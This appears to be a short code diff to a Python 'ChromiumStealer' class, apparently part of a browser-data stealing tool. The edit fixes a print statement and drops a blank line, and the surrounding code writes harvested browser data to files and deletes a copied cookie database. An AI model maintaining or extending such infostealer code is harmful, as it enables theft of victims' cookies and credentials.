@@ -95,7 +95,7 @@ class ChromiumStealer(ModuleManager):
             os.mkdir(browser_name)
         if content is not None:
             open(f'{browser_name}/{data_type}.txt', 'w').write(content)
-            print(f"\t [*] Saved in {browser}/{data_type}.txt")
+            print(f"\t [*] Saved in {browser_name}/{data_type}.txt")
         else:
             print(f"\t [-] No Data Found!")
 
@@ -175,7 +175,6 @@ class ChromiumStealer(ModuleManager):
         conn.close()
         os.remove('cookie_db')
         return result
-
 
 
     def installed_browsers(self):
